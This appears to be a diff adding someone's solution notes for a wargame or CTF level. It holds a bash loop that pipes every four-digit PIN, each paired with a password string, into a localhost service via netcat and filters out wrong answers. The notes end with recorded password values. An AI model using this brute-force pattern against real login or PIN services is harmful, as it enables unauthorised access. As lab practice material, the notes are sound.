@@ -1,0 +1,18 @@
+nc localhost 30002
+cd /tmp
+nano scrip_brute.sh
+
+
+#!/bin/bash 
+
+for i in {0000..9999}
+do 
+        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar  $i" 
+done | nc localhost 30002  | grep -v Wrong
+
+
+bash scrip_brute.sh
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 1234
+
+
+pass: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
